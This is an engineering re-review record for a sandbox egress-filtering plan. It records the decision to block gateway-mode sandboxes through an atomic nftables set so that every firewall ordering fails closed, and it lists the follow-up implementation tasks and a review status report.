| Choice | Current | A | B |
|---|---|---|---|
| E2 block mechanism | remove IP from `@fqdn_src`, rely on the iptables DROP; order unspecified | keep the design; add strict ordering rules (insert DROP → then remove from set; re-add to set → then clear DROP; restart-blocked is in-memory only) with interleaving tests | a gateway-owned `@blocked_src` set in `aerolvm_egress`: block adds the IP there (drop in forward and input, after the `established` reply accept on input), and the IP stays in `@fqdn_src`. Block is one atomic nft write inside the table that already filters the sandbox, and the iptables DROP stays as a second layer, so every order is fail-closed |

Question D2:
D2 — How should a gateway-mode sandbox be blocked (quota, block-all, hold)?
Project/branch/task: eng re-review of plans/egress-domain-filtering.md (gateway core §5.3), branch fix/go-race-coverage-tests.
ELI10: When a hostname-filtered sandbox is blocked (it hit its byte quota, the user turned on block-all, or the gateway couldn't apply its policy), the plan takes it out of the gateway's firewall list and trusts a separate iptables DROP rule, owned by sandboxd, to stop its traffic. Those are two firewalls in two processes. If the DROP comes off a moment before the sandbox goes back on the gateway's list, or the list removal happens before the DROP lands, the sandbox briefly has completely unfiltered internet. Either we write down strict ordering rules, or we block inside the gateway's own firewall table so no ordering matters.
Stakes if we pick wrong: a quota-unblock or a failed policy update can leave a sandbox briefly (or, on a failed write, indefinitely) with no egress filtering at all.
Recommendation: B because block becomes one atomic write in the table that already filters the sandbox, and every interleaving of the two firewalls stays closed.
Completeness: A=8/10, B=10/10
Net: keep the current design and police the order, or make the order irrelevant with a block set.
Header: Block path
Options:
A) Ordering rules
The DROP is inserted before the IP leaves `@fqdn_src`. The IP is re-added before the DROP is cleared. Restart-blocked is in-memory only. Interleaving tests cover quota unblock, the hold and gateway restart. Effort S (human ~4h / CC ~20min); risk medium. ✅ Smallest change to the approved design and set layout ✅ Tests pin each ordering so a regression shows up in CI ❌ Correctness depends on every current and future caller keeping the order across two processes; a failed DROP insert still opens egress
B) Gateway-owned block set (recommended)
New `@blocked_src` set in `aerolvm_egress`: drop in forward (first rule) and input (right after the established-reply accept, so toolbox exec still works). The IP stays in `@fqdn_src`. `SetBlocked` adds or removes the IP in one nft write, and the iptables DROP stays as a second layer. The §5.3 invariant becomes `ip ∈ @fqdn_src ⇔ gateway mode`. Effort S (human ~6h / CC ~30min); risk low. ✅ Every order of the two firewalls is fail-closed, including a failed DROP insert ✅ Block, hold and restart all use one mechanism inside one table ❌ One more set and two more rules in the layout, and the invariant text plus EF-13/EF-64 are rewritten

State: approved
Actual answer: "Gateway-owned block set (recommended)" (eng re-review D2, 2026-10-06)
Accepted scope: option B exactly. Applied to §4, the §5.2 diagram and sets, the §5.3 SetBlocked/hold/restart/invariant text, EF-13 and EF-64.
Mechanics needed for B's "every order is fail-closed" contract: `SetBlocked` is reason-keyed (`block_all`/`quota`/`hold`), so one blocker's unblock can't lift another's. The restart block stays in-memory until `Sync` (D13 keeps kernel sets untouched).
History: pending → approved (D2)

Approval readiness: PASS (eng re-review, 2026-10-06). Checked:
- **E1:** the actual answer to D1, "Gossip field + size test (recommended)".
- **E2:** the actual answer to D2, "Gateway-owned block set (recommended)".
- **Contract repairs** that keep earlier approvals intact and add no behavior:
  - S3 repairs CEO D16's "keep it shut" contract.
  - S5 implements CEO D22's "work that needs more privilege moves to
    sandboxd", with D21's discovery kept.
  - S10 repairs the fail-closed G7 and CEO D10 rejects.
- **Factual consistency against D16 and D20:** S2, S4, S6 and S8.
- **Implementation mechanics of approved behavior:**
  - S7: X1 learn mode, placed per the eng D3 package layout;
  - S9: the snapshot layout behind X1 and D13;
  - S11: fds for the D17 caps.
- **TODO proposals:** none. Every finding was resolved in-plan.
- **Unresolved decisions:** none.

## Eng re-review implementation tasks
Synthesized from this review's findings. Each task derives from a specific
finding above. Run with Claude Code or Codex; checkbox as you ship. The ratio
assumption is architecture or bug-fix work with regression tests, about 10-20x.

- [ ] **T54 (P2, human: ~3h / CC: ~20min)** — internal/cluster — Gossip `fv` field and the profile-write version gate
  - Surfaced by: Scope Challenge — E1/D1 (no member version reporting exists; capacity lease skips server-only voters)
  - Files: `internal/cluster/gossip.go`, the FSM profile-write path (with T34), `internal/cluster/gossip_test.go`, FSM tests
  - Verify: EF-74; `go test ./internal/cluster/...`; rule-6 PR call-out
- [ ] **T55 (P1, human: ~6h / CC: ~30min)** — internal/egress + service — `@blocked_src` with reason-keyed `SetBlocked`; the hold also blocks the redirect path
  - Surfaced by: Section 1 — E2/D2 (two-firewall ordering fail-open) and Scope Challenge S3 (a held, attached sandbox kept being proxied)
  - Files: `internal/egress` (nft layout, SetBlocked, Sync, restart), `internal/service` (block-all, quota, hold callers), gateway tests
  - Verify: EF-13, EF-64, EF-69
- [ ] **T56 (P1, human: ~4h / CC: ~20min)** — internal/egress nft — Verdict-less audit insert rules, set sizes, per-source meter, overflow counter
  - Surfaced by: Section 4 — S10 (`NFT_BREAK` on a full dynamic set skips the reject on the same rule → cross-tenant fail-open)
  - Files: `internal/egress` nft layout + backend fake, the integration-tagged nft test, `setup/prometheus` (overflow metric)
  - Verify: EF-77 (real-kernel netns under the integration tag); rule-shape assertion in the backend fake
- [ ] **T57 (P1, human: ~1 day / CC: ~1h)** — packaging + egress + sandboxd — systemd socket unit, bridge list over the UDS plus snapshot, sandboxd-run probe client, `LimitNOFILE=131072`
  - Surfaced by: Section 1 — S5 (gateway privilege vs docker inspect, socket ownership and the self-test) and Section 4 — S11 (fd budget)
  - Files: `packaging/` (units), `internal/egress` (bind from snapshot), `internal/service` (bridge report, probe), install.sh/Terraform/Ansible unit wiring
  - Verify: EF-68, EF-75; the unit runs as `aerolvm-egress` with no docker socket access
- [ ] **T58 (P2, human: ~1 day / CC: ~1h)** — pkg/egresspolicy + internal/egress — A shared learn `Recorder` and per-sandbox recording snapshot files
  - Surfaced by: Section 2 — S7 (three runtimes, unplaced suggestion logic) and Section 4 — S9 (~100 MB per 5 s snapshot rewrites at density)
  - Files: `pkg/egresspolicy/recorder.go` + test, the gateway snapshot, the WASM mediator, the isolate host
  - Verify: EF-76

Parallelization: no new lanes.
- T55, T56 and T57 join the "Gateway core + process" step.
- T58 joins "Phase 2 CEO items".
- T54 joins the Phase 2 cluster work next to T34.

## Eng re-review completion summary
- Step 0: Scope Challenge — scope accepted as-is. Three findings: E1 → D1,
  plus S2 and S3 applied.
- Architecture Review: 5 issues found (E2 → D2; S4, S5, S6 and S8 applied).
- Code Quality Review: 1 issue found (S7 applied).
- Test Review: diagram produced. 4 gaps identified and closed with EF-74..EF-77;
  EF-13, EF-64 and EF-69 rewritten; test plan artifact updated.
- Performance Review: 3 issues found (S9, S10, S11 applied). S10 was a
  cross-tenant fail-open.
- NOT in scope: written (unchanged from prior reviews).
- What already exists: written (unchanged).
- TODOS.md updates: 0 items proposed to user.
- Failure modes: 0 critical gaps remain. S10 was flagged and closed by T56 +
  EF-77.
- Unresolved decisions: 0 in this review.
- Outside voice: codex unavailable (`model_unusable`: the gstack resolver
  script is missing). The native fallback was unavailable (no TaskOutput
  tool). Recorded as unavailable; no outside coverage.
- Parallelization: 4 lanes, 4 parallel at launch / 8 sequential steps after
  (unchanged; new tasks join existing steps).
- Lake Score: 2/2 = both answers picked the 10/10 option.

## GSTACK REVIEW REPORT

| Review | Trigger | Why | Runs | Status | Findings |
|--------|---------|-----|------|--------|----------|
| CEO Review | `/plan-ceo-review` | Scope & strategy | 1 | CLEAR | 6 proposals, 6 accepted, 0 deferred |
| Outside Review | codex, outside voice of `/plan-eng-review` (×2) and `/plan-ceo-review` | Independent 2nd opinion | 3 | unavailable | `model_unusable` every time (gstack Codex model resolver script missing); no completed external review |
| Eng Review | `/plan-eng-review` | Architecture & tests (required) | 2 | ISSUES OPEN | 13 issues, 0 critical gaps (re-review after the CEO review; all 13 resolved in-plan or mapped to T54-T58; 2 user decisions D1-D2) |
| Design Review | `/plan-design-review` | UI/UX gaps | 0 | — | — |
| DX Review | `/plan-devex-review` | Developer experience gaps | 0 | — | — |

- **OUTSIDE COVERAGE:** codex, plan-review phase, three attempts (eng
  2026-10-05, CEO 2026-10-06, eng re-review 2026-10-06). All were unavailable
  (`model_unusable`). The Claude-subagent fallback was unavailable each time
  (no bounded-wait task-output tool). There are no outside findings, and this
  does not count as clean.
- **CROSS-MODEL:** not applicable; no completed external review.
- **VERDICT:** CEO CLEARED.
  - The Eng Review is current (it covers CEO D1-D25) and records ISSUES OPEN.
  - All 13 findings are resolved in the plan or mapped to tasks T54-T58.
  - There are no open decisions.
  - eng review required

NO UNRESOLVED DECISIONS
